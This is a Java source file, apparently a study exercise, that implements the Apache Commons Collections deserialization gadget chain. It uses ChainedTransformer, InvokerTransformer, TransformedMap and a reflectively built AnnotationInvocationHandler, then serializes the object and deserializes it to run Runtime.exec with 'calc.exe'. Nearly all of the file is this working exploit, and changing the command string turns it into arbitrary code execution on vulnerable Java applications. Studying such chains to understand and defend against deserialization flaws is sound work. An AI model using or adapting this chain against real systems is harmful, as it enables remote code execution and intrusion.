package org.ixpqxi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.ixpqxi.util.SerTools;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class SolvedProblemRuntime {
    @SuppressWarnings("ExtractMethodRecommender")
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        });

        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        @SuppressWarnings("unchecked")
        Map<Object, Object>  decorate = TransformedMap.decorate(map, null, chainedTransformer);
//        for(Map.Entry entry : decorate.entrySet()) {
//            entry.setValue(Runtime.class);
//        }

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Override.class, decorate);

        SerTools.serialize(obj);
        SerTools.unserialize("ser.bin");
    }

    @SuppressWarnings("unused")
    public static void chainedTransformerDemo() {
//        Class runtimeClass = Runtime.class;
//
//        Method getRuntime = runtimeClass.getMethod("getRuntime");
//        Runtime runtimeObj = (Runtime) getRuntime.invoke(null, null);
//
//        Method exec = runtimeClass.getMethod("exec", String.class);
//        exec.invoke(runtimeObj, "calc.exe");

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        });

        chainedTransformer.transform(Runtime.class);
    }
}
